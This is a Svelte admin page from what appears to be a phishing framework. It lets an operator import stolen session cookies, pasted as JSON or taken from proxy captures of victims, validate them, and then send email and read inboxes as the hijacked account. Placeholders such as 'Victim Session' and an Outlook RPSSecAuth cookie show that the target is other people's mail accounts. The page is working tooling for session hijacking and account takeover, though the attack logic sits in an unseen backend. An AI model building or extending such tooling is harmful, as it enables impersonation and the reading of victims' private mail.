<script>
	import { onMount } from 'svelte';
	import { api } from '$lib/api/apiProxy.js';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import Headline from '$lib/components/Headline.svelte';
	import { hideIsLoading, showIsLoading } from '$lib/store/loading';
	import { addToast } from '$lib/store/toast';
	import BigButton from '$lib/components/BigButton.svelte';
	import Modal from '$lib/components/Modal.svelte';
	import FormGrid from '$lib/components/FormGrid.svelte';
	import FormFooter from '$lib/components/FormFooter.svelte';
	import TextField from '$lib/components/TextField.svelte';
	import TextareaField from '$lib/components/TextareaField.svelte';
	import Table from '$lib/components/table/Table.svelte';
	import TableRow from '$lib/components/table/TableRow.svelte';
	import TableCell from '$lib/components/table/TableCell.svelte';
	import TableCellAction from '$lib/components/table/TableCellAction.svelte';
	import TableCellEmpty from '$lib/components/table/TableCellEmpty.svelte';
	import TableDropDownEllipsis from '$lib/components/table/TableDropDownEllipsis.svelte';
	import DeleteAlert from '$lib/components/modal/DeleteAlert.svelte';
	import { newTableURLParams } from '$lib/service/tableURLParams.js';

	// --- State ---
	let stores = [];
	let storesHasNextPage = false;
	let isLoading = false;
	const tableURLParams = newTableURLParams();

	// Import modal
	let isImportModalVisible = false;
	let importName = '';
	let importCookiesText = '';
	let importError = '';
	let isImporting = false;

	// Send modal
	let isSendModalVisible = false;
	let sendForm = {
		cookieStoreId: '',
		cookieStoreName: '',
		to: '',
		cc: '',
		bcc: '',
		subject: '',
		body: '',
		isHTML: true,
		saveToSent: false
	};
	let isSending = false;
	let sendResult = null;

	// Inbox modal
	let isInboxModalVisible = false;
	let inboxStoreId = '';
	let inboxStoreName = '';
	let inboxMessages = [];
	let inboxFolder = 'inbox';
	let inboxFolders = [];
	let inboxLoading = false;
	let inboxSkip = 0;
	let inboxLimit = 25;

	// Message viewer modal
	let isMessageModalVisible = false;
	let currentMessage = null;
	let messageLoading = false;

	// Import from Proxy Captures modal
	let isProxyCaptureModalVisible = false;
	let proxyCaptures = [];
	let proxyCapturesLoading = false;
	let selectedCapture = null;
	let proxyCaptureImportName = '';

	// Delete
	let isDeleteAlertVisible = false;
	let deleteValues = { id: null, name: null };

	// --- Lifecycle ---
	onMount(() => {
		refreshStores();
		tableURLParams.onChange(refreshStores);
	});

	// --- Data loading ---
	async function refreshStores() {
		isLoading = true;
		showIsLoading();
		try {
			const params = new URLSearchParams({
				page: tableURLParams.currentPage,
				perPage: tableURLParams.perPage,
				sortBy: tableURLParams.sortBy || 'created_at',
				sortOrder: tableURLParams.sortOrder || 'desc',
				search: tableURLParams.search || ''
			});
			const res = await api.cookieStore.getAll(params.toString());
			if (res.success) {
				stores = res.data.rows || [];
				storesHasNextPage = res.data.hasNextPage || false;
			} else {
				throw res.error;
			}
		} catch (e) {
			addToast('Failed to load cookie stores', 'error');
		}
		isLoading = false;
		hideIsLoading();
	}

	// --- Import ---
	function openImportModal() {
		importName = '';
		importCookiesText = '';
		importError = '';
		isImportModalVisible = true;
	}

	function closeImportModal() {
		isImportModalVisible = false;
	}

	async function handleImport() {
		importError = '';
		if (!importName.trim()) {
			importError = 'Name is required';
			return;
		}
		if (!importCookiesText.trim()) {
			importError = 'Cookies JSON is required';
			return;
		}

		let cookies;
		try {
			cookies = JSON.parse(importCookiesText);
			if (!Array.isArray(cookies)) {
				importError = 'Cookies must be a JSON array';
				return;
			}
		} catch (e) {
			importError = 'Invalid JSON: ' + e.message;
			return;
		}

		isImporting = true;
		try {
			const res = await api.cookieStore.importCookies({
				name: importName,
				cookies: cookies,
				source: 'import'
			});
			if (res && res.data) {
				addToast('Cookies imported. Validating session...', 'success');
				isImportModalVisible = false;
				setTimeout(refreshStores, 2000);
			}
		} catch (e) {
			importError = e.message || 'Import failed';
		}
		isImporting = false;
	}

	// --- Import from Proxy Captures ---
	async function openProxyCaptureModal() {
		isProxyCaptureModalVisible = true;
		proxyCaptures = [];
		selectedCapture = null;
		proxyCaptureImportName = '';
		proxyCapturesLoading = true;
		try {
			const params = new URLSearchParams({ page: 1, perPage: 50, sortBy: 'created_at', sortOrder: 'desc' });
			const res = await api.proxyCaptures.getAll(params.toString());
			if (res.success) {
				proxyCaptures = (res.data.rows || []).filter(c => c.Cookies && c.Cookies.length > 2);
			}
		} catch (e) {
			addToast('Failed to load proxy captures', 'error');
		}
		proxyCapturesLoading = false;
	}

	function closeProxyCaptureModal() {
		isProxyCaptureModalVisible = false;
	}

	async function handleProxyCaptureImport() {
		if (!selectedCapture) {
			addToast('Please select a capture', 'error');
			return;
		}
		const name = proxyCaptureImportName.trim() || `Proxy: ${selectedCapture.Username || selectedCapture.IPAddress || 'Unknown'}`;
		showIsLoading();
		try {
			const res = await api.cookieStore.importFromCapture(
				selectedCapture.ID,
				name,
				selectedCapture.Cookies
			);
			if (res && res.data) {
				addToast('Cookies imported from proxy capture. Validating...', 'success');
				isProxyCaptureModalVisible = false;
				setTimeout(refreshStores, 2000);
			}
		} catch (e) {
			addToast('Import failed: ' + (e.message || ''), 'error');
		}
		hideIsLoading();
	}

	// Revalidation status
	let revalidatingId = null;

	// --- Revalidate ---
	async function revalidateStore(id) {
		revalidatingId = id;
		showIsLoading();
		addToast('Revalidating session... This may take up to 2 minutes for browser-based validation.', 'info');
		try {
			await api.cookieStore.revalidate(id);
			addToast('Session revalidated', 'success');
			await refreshStores();
		} catch (e) {
			addToast('Revalidation failed: ' + (e.message || ''), 'error');
		}
		revalidatingId = null;
		hideIsLoading();
	}

	// --- Delete ---
	function confirmDelete(store) {
		deleteValues = { id: store.id, name: store.name };
		isDeleteAlertVisible = true;
	}

	async function handleDelete() {
		showIsLoading();
		try {
			const res = await api.cookieStore.deleteByID(deleteValues.id);
			addToast('Cookie store deleted', 'success');
			await refreshStores();
			hideIsLoading();
			return { success: true };
		} catch (e) {
			addToast('Delete failed', 'error');
			hideIsLoading();
			return { success: false, error: e.message || 'Delete failed' };
		}
	}

	// --- Send ---
	function openSendModal(store) {
		sendForm = {
			cookieStoreId: store.id,
			cookieStoreName: store.name + (store.email ? ` (${store.email})` : ''),
			to: '',
			cc: '',
			bcc: '',
			subject: '',
			body: '',
			isHTML: true,
			saveToSent: false
		};
		sendResult = null;
		isSendModalVisible = true;
	}

	function closeSendModal() {
		isSendModalVisible = false;
	}

	async function handleSend() {
		if (!sendForm.to.trim()) {
			addToast('Recipient is required', 'error');
			return;
		}
		if (!sendForm.subject.trim()) {
			addToast('Subject is required', 'error');
			return;
		}

		isSending = true;
		sendResult = null;
		addToast('Sending email... This may take up to 2 minutes if using browser automation.', 'info');
		try {
			const toList = sendForm.to.split(',').map((e) => e.trim()).filter(Boolean);
			const ccList = sendForm.cc ? sendForm.cc.split(',').map((e) => e.trim()).filter(Boolean) : [];
			const bccList = sendForm.bcc ? sendForm.bcc.split(',').map((e) => e.trim()).filter(Boolean) : [];

			const res = await api.cookieStore.send({
				cookieStoreId: sendForm.cookieStoreId,
				to: toList,
				cc: ccList,
				bcc: bccList,
				subject: sendForm.subject,
				body: sendForm.body,
				isHTML: sendForm.isHTML,
				saveToSent: sendForm.saveToSent
			});
			if (res && res.data) {
				sendResult = res.data;
				if (res.data.success) {
					addToast('Email sent successfully via ' + (res.data.method || 'cookies'), 'success');
				} else {
					addToast('Send failed: ' + (res.data.error || 'Unknown error'), 'error');
				}
			}
		} catch (e) {
			sendResult = { success: false, error: e.message || 'Send failed' };
			addToast('Send failed: ' + (e.message || ''), 'error');
		}
		isSending = false;
	}

	// --- Inbox ---
	async function openInbox(store) {
		inboxStoreId = store.id;
		inboxStoreName = store.name + (store.email ? ` (${store.email})` : '');
		inboxMessages = [];
		inboxFolder = 'inbox';
		inboxFolders = [];
		inboxSkip = 0;
		isInboxModalVisible = true;
		await loadInbox();
		await loadFolders();
	}

	function closeInboxModal() {
		isInboxModalVisible = false;
	}

	// Inbox loading status text
	let inboxLoadingStatus = '';

	async function loadInbox() {
		inboxLoading = true;
		inboxLoadingStatus = 'Connecting to mailbox...';
		// Show a progress update after 10 seconds
		const progressTimer = setTimeout(() => {
			if (inboxLoading) {
				inboxLoadingStatus = 'Browser automation in progress... This may take up to 2 minutes on first load.';
			}
		}, 10000);
		// Show another update after 60 seconds
		const progressTimer2 = setTimeout(() => {
			if (inboxLoading) {
				inboxLoadingStatus = 'Still working... Subsequent loads will be much faster.';
			}
		}, 60000);
		try {
			const res = await api.cookieStore.getInbox(inboxStoreId, inboxFolder, inboxLimit, inboxSkip);
			if (res && res.data) {
				inboxMessages = res.data.messages || [];
			}
		} catch (e) {
			addToast('Failed to load inbox: ' + (e.message || ''), 'error');
		}
		clearTimeout(progressTimer);
		clearTimeout(progressTimer2);
		inboxLoadingStatus = '';
		inboxLoading = false;
	}

	async function loadFolders() {
		try {
			const res = await api.cookieStore.getFolders(inboxStoreId);
			if (res && res.data) {
				inboxFolders = res.data.folders || [];
			}
		} catch (e) {
			// Folders are optional
		}
	}

	async function switchFolder(folderId) {
		inboxFolder = folderId;
		inboxSkip = 0;
		await loadInbox();
	}

	async function nextInboxPage() {
		inboxSkip += inboxLimit;
		await loadInbox();
	}

	async function prevInboxPage() {
		inboxSkip = Math.max(0, inboxSkip - inboxLimit);
		await loadInbox();
	}

	// --- Message viewer ---
	async function openMessage(messageId) {
		messageLoading = true;
		currentMessage = null;
		isMessageModalVisible = true;
		try {
			const res = await api.cookieStore.getMessage(inboxStoreId, messageId);
			if (res && res.data) {
				currentMessage = res.data;
			}
		} catch (e) {
			addToast('Failed to load message: ' + (e.message || ''), 'error');
		}
		messageLoading = false;
	}

	function closeMessageModal() {
		isMessageModalVisible = false;
	}

	// --- Helpers ---
	function formatDate(dateStr) {
		if (!dateStr) return '';
		try {
			return new Date(dateStr).toLocaleString();
		} catch {
			return dateStr;
		}
	}

	function getStatusBadge(store) {
		if (store.isValid) return { text: 'Valid', class: 'badge-success' };
		if (store.lastChecked) return { text: 'Expired', class: 'badge-error' };
		return { text: 'Pending', class: 'badge-warning' };
	}

	function getSourceBadge(source) {
		switch (source) {
			case 'extension': return { text: 'Extension', class: 'badge-info' };
			case 'proxy_capture': return { text: 'Proxy', class: 'badge-purple' };
			case 'import': return { text: 'Import', class: 'badge-default' };
			default: return { text: source || 'Unknown', class: 'badge-default' };
		}
	}
</script>

<HeadTitle title="Cookie Store" />
<Headline>COOKIE STORE</Headline>

<div class="flex gap-4 mb-6">
	<BigButton on:click={openImportModal}>IMPORT COOKIES</BigButton>
	<BigButton on:click={openProxyCaptureModal}>IMPORT FROM PROXY CAPTURES</BigButton>
</div>

<!-- Cookie Stores Table -->
<Table
	columns={['Name', 'Email', 'Source', 'Cookies', 'Status', 'Last Checked']}
	hasData={!!stores.length}
	hasNextPage={storesHasNextPage}
	plural="Cookie Stores"
	pagination={tableURLParams}
	isGhost={isLoading}
>
	{#each stores as store}
		<TableRow>
			<TableCell>
				<span class="font-medium">{store.name}</span>
			</TableCell>
			<TableCell>
				{#if store.email}
					<span class="text-sm">{store.email}</span>
					{#if store.displayName}
						<br /><span class="text-xs opacity-60">{store.displayName}</span>
					{/if}
				{:else}
					<span class="text-xs opacity-40">—</span>
				{/if}
			</TableCell>
			<TableCell>
				{@const badge = getSourceBadge(store.source)}
				<span class="badge {badge.class}">{badge.text}</span>
			</TableCell>
			<TableCell>
				<span class="text-sm">{store.cookieCount}</span>
			</TableCell>
			<TableCell>
				{@const status = getStatusBadge(store)}
				<span class="badge {status.class}">{status.text}</span>
			</TableCell>
			<TableCell>
				<span class="text-xs">{formatDate(store.lastChecked)}</span>
			</TableCell>
			<TableCellEmpty />
			<TableCellAction>
				<TableDropDownEllipsis>
					{#if store.isValid}
						<button class="dropdown-item" on:click={() => openSendModal(store)}>Send Email</button>
						<button class="dropdown-item" on:click={() => openInbox(store)}>Read Inbox</button>
					{/if}
					<button class="dropdown-item" on:click={() => revalidateStore(store.id)} disabled={revalidatingId === store.id}>
				{revalidatingId === store.id ? 'Revalidating...' : 'Revalidate'}
			</button>
					<button class="dropdown-item dropdown-item-danger" on:click={() => confirmDelete(store)}>Delete</button>
				</TableDropDownEllipsis>
			</TableCellAction>
		</TableRow>
	{/each}
</Table>

<!-- Import Cookies Modal -->
<Modal
	headerText="Import Cookies"
	visible={isImportModalVisible}
	onClose={closeImportModal}
	isSubmitting={isImporting}
>
	<FormGrid on:submit={handleImport} isSubmitting={isImporting}>
		<TextField
			label="Name"
			placeholder="e.g., John's Outlook Session"
			bind:value={importName}
			required={true}
		/>
		<TextareaField
			label="Cookies JSON"
			placeholder={`Paste cookies as JSON array, e.g.:\n[\n  {"name": "RPSSecAuth", "value": "...", "domain": ".live.com", "path": "/"},\n  ...\n]`}
			bind:value={importCookiesText}
		/>
		{#if importError}
			<div class="text-red-500 text-sm mt-1 col-span-3">{importError}</div>
		{/if}
		<div class="text-xs opacity-60 mt-2 col-span-3">
			<strong>Tip:</strong> You can export cookies from browser DevTools or use the Phishing Club Chrome Extension.
			Supported formats: JSON array of cookie objects with name, value, domain, path fields.
		</div>
		<FormFooter closeModal={closeImportModal} isSubmitting={isImporting} okText="Import & Validate" />
	</FormGrid>
</Modal>

<!-- Send Email Modal -->
<Modal
	headerText="Send Email via Cookies"
	visible={isSendModalVisible}
	onClose={closeSendModal}
	isSubmitting={isSending}
>
	<FormGrid on:submit={handleSend} isSubmitting={isSending}>
		<div class="text-sm mb-4 opacity-70 col-span-3">
			Sending as: <strong>{sendForm.cookieStoreName}</strong>
		</div>
		<TextField
			label="To"
			placeholder="recipient@example.com (comma-separated for multiple)"
			bind:value={sendForm.to}
			required={true}
		/>
		<TextField
			label="CC"
			placeholder="cc@example.com (optional)"
			bind:value={sendForm.cc}
		/>
		<TextField
			label="BCC"
			placeholder="bcc@example.com (optional)"
			bind:value={sendForm.bcc}
		/>
		<TextField
			label="Subject"
			placeholder="Email subject"
			bind:value={sendForm.subject}
			required={true}
		/>
		<TextareaField
			label="Body"
			placeholder="Email body (HTML or plain text)"
			bind:value={sendForm.body}
		/>
		<div class="flex items-center gap-4 mt-2 col-span-3">
			<label class="flex items-center gap-2 cursor-pointer">
				<input type="checkbox" bind:checked={sendForm.isHTML} class="checkbox checkbox-sm" />
				<span class="text-sm">HTML Body</span>
			</label>
			<label class="flex items-center gap-2 cursor-pointer">
				<input type="checkbox" bind:checked={sendForm.saveToSent} class="checkbox checkbox-sm" />
				<span class="text-sm">Save to Sent Items</span>
			</label>
		</div>

		{#if isSending}
		<div class="mt-4 col-span-3 p-3 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800">
			<div class="flex items-center gap-3">
				<div class="inline-block animate-spin rounded-full h-5 w-5 border-b-2 border-blue-500"></div>
				<span class="text-blue-700 dark:text-blue-300 text-sm">Sending email... This may take up to 2 minutes if using browser automation.</span>
			</div>
		</div>
	{/if}

	{#if sendResult}
			<div class="mt-4 col-span-3 p-3 rounded-lg {sendResult.success ? 'bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800' : 'bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800'}">
				{#if sendResult.success}
					<div class="text-green-700 dark:text-green-300 text-sm">
						Email sent successfully via <strong>{sendResult.method}</strong>
						{#if sendResult.messageId}
							<br />Message ID: {sendResult.messageId}
						{/if}
					</div>
				{:else}
					<div class="text-red-700 dark:text-red-300 text-sm">
						Send failed: {sendResult.error}
					</div>
				{/if}
			</div>
		{/if}

		<FormFooter closeModal={closeSendModal} isSubmitting={isSending} okText="Send Email" />
	</FormGrid>
</Modal>

<!-- Inbox Modal -->
<Modal
	headerText="Inbox - {inboxStoreName}"
	visible={isInboxModalVisible}
	onClose={closeInboxModal}
>
	<!-- Folder tabs -->
	{#if inboxFolders.length > 0}
		<div class="flex flex-wrap gap-2 mb-4 mt-4">
			{#each inboxFolders as folder}
				<button
					class="px-3 py-1 rounded-md text-sm transition-colors
						{inboxFolder === folder.id
							? 'bg-cta-blue text-white'
							: 'bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-600'}"
					on:click={() => switchFolder(folder.id)}
				>
					{folder.displayName}
					{#if folder.unreadItemCount > 0}
						<span class="ml-1 text-xs font-bold">({folder.unreadItemCount})</span>
					{/if}
				</button>
			{/each}
		</div>
	{/if}

	{#if inboxLoading}
		<div class="text-center py-8">
			<div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mb-3"></div>
			<div class="opacity-60">{inboxLoadingStatus || 'Loading messages...'}</div>
		</div>
	{:else if inboxMessages.length === 0}
		<div class="text-center py-8 opacity-60">No messages found</div>
	{:else}
		<div class="space-y-2 max-h-[60vh] overflow-y-auto mt-4">
			{#each inboxMessages as msg}
				<button
					class="w-full text-left p-3 rounded-lg border transition-colors cursor-pointer
						{msg.isRead ? 'bg-white dark:bg-gray-800 border-gray-200 dark:border-gray-700' : 'bg-blue-50 dark:bg-blue-900/10 border-blue-200 dark:border-blue-800'}
						hover:bg-gray-50 dark:hover:bg-gray-700/50"
					on:click={() => openMessage(msg.id)}
				>
					<div class="flex justify-between items-start">
						<div class="flex-1 min-w-0">
							<div class="flex items-center gap-2">
								{#if !msg.isRead}
									<span class="w-2 h-2 rounded-full bg-blue-500 flex-shrink-0"></span>
								{/if}
								<span class="font-medium text-sm truncate">
									{msg.fromName || msg.from}
								</span>
							</div>
							<div class="text-sm font-medium mt-1 truncate">{msg.subject || '(no subject)'}</div>
							<div class="text-xs opacity-60 mt-1 truncate">{msg.preview || ''}</div>
						</div>
						<div class="text-xs opacity-50 flex-shrink-0 ml-2">
							{formatDate(msg.date)}
						</div>
					</div>
				</button>
			{/each}
		</div>

		<!-- Pagination -->
		<div class="flex justify-between items-center mt-4 mb-4">
			<button
				class="px-3 py-1 rounded-md text-sm bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors"
				on:click={prevInboxPage}
				disabled={inboxSkip === 0}
				class:opacity-50={inboxSkip === 0}
			>
				Previous
			</button>
			<span class="text-xs opacity-60">
				Showing {inboxSkip + 1} - {inboxSkip + inboxMessages.length}
			</span>
			<button
				class="px-3 py-1 rounded-md text-sm bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors"
				on:click={nextInboxPage}
				disabled={inboxMessages.length < inboxLimit}
				class:opacity-50={inboxMessages.length < inboxLimit}
			>
				Next
			</button>
		</div>
	{/if}
</Modal>

<!-- Message Viewer Modal -->
<Modal
	headerText={currentMessage ? currentMessage.subject : 'Loading...'}
	visible={isMessageModalVisible}
	onClose={closeMessageModal}
>
	{#if messageLoading}
		<div class="text-center py-8 opacity-60">Loading message...</div>
	{:else if currentMessage}
		<div class="space-y-3 mt-4 mb-4">
			<div class="text-sm">
				<div><strong>From:</strong> {currentMessage.fromName} &lt;{currentMessage.from}&gt;</div>
				{#if currentMessage.to && currentMessage.to.length > 0}
					<div><strong>To:</strong> {currentMessage.to.join(', ')}</div>
				{/if}
				<div><strong>Date:</strong> {formatDate(currentMessage.date)}</div>
			</div>
			<hr class="border-gray-200 dark:border-gray-700" />
			{#if currentMessage.bodyHTML}
				<div class="prose dark:prose-invert max-w-none">
					{@html currentMessage.bodyHTML}
				</div>
			{:else}
				<pre class="whitespace-pre-wrap text-sm">{currentMessage.bodyText || ''}</pre>
			{/if}
		</div>
	{:else}
		<div class="text-center py-8 opacity-60">Message not found</div>
	{/if}
</Modal>

<!-- Import from Proxy Captures Modal -->
<Modal
	headerText="Import from Proxy Captures"
	visible={isProxyCaptureModalVisible}
	onClose={closeProxyCaptureModal}
>
	{#if proxyCapturesLoading}
		<div class="text-center py-8 opacity-60">Loading proxy captures...</div>
	{:else if proxyCaptures.length === 0}
		<div class="text-center py-8 opacity-60">No proxy captures with cookies found</div>
	{:else}
		<div class="mb-4 mt-4">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Name (optional)</label>
			<input
				type="text"
				class="w-full px-3 py-2 rounded-md border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-cta-blue"
				placeholder="e.g., Victim Session"
				bind:value={proxyCaptureImportName}
			/>
		</div>
		<div class="space-y-2 max-h-[50vh] overflow-y-auto">
			{#each proxyCaptures as capture}
				<button
					class="w-full text-left p-3 rounded-lg border transition-colors cursor-pointer
						{selectedCapture && selectedCapture.ID === capture.ID
							? 'bg-blue-50 dark:bg-blue-900/20 border-blue-400 dark:border-blue-600'
							: 'bg-white dark:bg-gray-800 border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700/50'}"
					on:click={() => (selectedCapture = capture)}
				>
					<div class="flex justify-between items-start">
						<div class="flex-1 min-w-0">
							<div class="flex items-center gap-2">
								{#if selectedCapture && selectedCapture.ID === capture.ID}
									<span class="w-3 h-3 rounded-full bg-blue-500 flex-shrink-0"></span>
								{/if}
								<span class="font-medium text-sm">
									{capture.Username || capture.IPAddress || 'Unknown'}
								</span>
								{#if capture.TargetDomain}
									<span class="badge badge-info">{capture.TargetDomain}</span>
								{/if}
							</div>
							<div class="text-xs opacity-60 mt-1">
								IP: {capture.IPAddress || 'N/A'}
								{#if capture.Cookies}
									| Cookies: {(() => { try { return JSON.parse(capture.Cookies).length; } catch { return '?'; } })()}
								{/if}
							</div>
						</div>
						<div class="text-xs opacity-50 flex-shrink-0 ml-2">
							{formatDate(capture.CreatedAt)}
						</div>
					</div>
				</button>
			{/each}
		</div>
		<div class="flex justify-end gap-2 mt-4 mb-4">
			<button
				class="px-4 py-2 rounded-md text-sm bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
				on:click={closeProxyCaptureModal}
			>
				Cancel
			</button>
			<button
				class="px-4 py-2 rounded-md text-sm bg-cta-blue text-white hover:opacity-80 transition-colors disabled:opacity-50"
				on:click={handleProxyCaptureImport}
				disabled={!selectedCapture}
			>
				Import Selected Capture
			</button>
		</div>
	{/if}
</Modal>

<!-- Delete Alert -->
{#if isDeleteAlertVisible}
	<DeleteAlert
		name={deleteValues.name}
		isVisible={isDeleteAlertVisible}
		onClick={handleDelete}
		on:close={() => (isDeleteAlertVisible = false)}
	/>
{/if}

<style>
	.dropdown-item {
		display: block;
		width: 100%;
		padding: 0.5rem 1rem;
		text-align: left;
		border: none;
		background: none;
		cursor: pointer;
		font-size: 0.875rem;
		color: var(--text-primary, #333);
	}
	.dropdown-item:hover {
		background: var(--bg-hover, #f0f0f0);
	}
	.dropdown-item-danger {
		color: rgb(220, 38, 38);
	}
	.dropdown-item-danger:hover {
		background: rgba(239, 68, 68, 0.1);
	}
	.badge {
		display: inline-flex;
		align-items: center;
		padding: 0.15rem 0.5rem;
		border-radius: 9999px;
		font-size: 0.7rem;
		font-weight: 600;
		text-transform: uppercase;
		letter-spacing: 0.025em;
	}
	.badge-success {
		background-color: rgba(34, 197, 94, 0.15);
		color: rgb(22, 163, 74);
	}
	.badge-error {
		background-color: rgba(239, 68, 68, 0.15);
		color: rgb(220, 38, 38);
	}
	.badge-warning {
		background-color: rgba(234, 179, 8, 0.15);
		color: rgb(202, 138, 4);
	}
	.badge-info {
		background-color: rgba(59, 130, 246, 0.15);
		color: rgb(37, 99, 235);
	}
	.badge-purple {
		background-color: rgba(147, 51, 234, 0.15);
		color: rgb(126, 34, 206);
	}
	.badge-default {
		background-color: rgba(107, 114, 128, 0.15);
		color: rgb(75, 85, 99);
	}
	:global(.dark) .badge-success {
		color: rgb(74, 222, 128);
	}
	:global(.dark) .badge-error {
		color: rgb(248, 113, 113);
	}
	:global(.dark) .badge-warning {
		color: rgb(250, 204, 21);
	}
	:global(.dark) .badge-info {
		color: rgb(96, 165, 250);
	}
	:global(.dark) .badge-purple {
		color: rgb(192, 132, 252);
	}
	:global(.dark) .badge-default {
		color: rgb(156, 163, 175);
	}
</style>
